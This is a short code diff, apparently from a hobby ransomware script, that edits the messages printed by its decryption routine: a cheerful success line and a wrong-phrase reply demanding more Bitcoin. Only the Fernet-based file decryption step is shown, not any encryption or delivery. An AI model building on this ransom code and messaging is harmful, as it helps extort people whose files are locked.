@@ -27,6 +27,12 @@ if user_phrase == secret_phrase:
         contents_decrypted = Fernet(secret_key).decrypt(contents)
         with open(file, "wb") as thefile:
             thefile.write(contents_decrypted)
-        print("Congrats, your files have been decrypted. Enjoy your coffee.")
+        print(
+            "Congrats, your files have been decrypted. "
+            "Enjoy your coffee ️❤ ☕ ❤"
+        )
 else:
-    print("Sorry, wrong secret phrase. Send me more Bitcoin.")
+    print(
+        "Sorry not sorry, but you entered da wong secret phrase. "
+        "Send me more Bitcoin! 🤑"
+    )
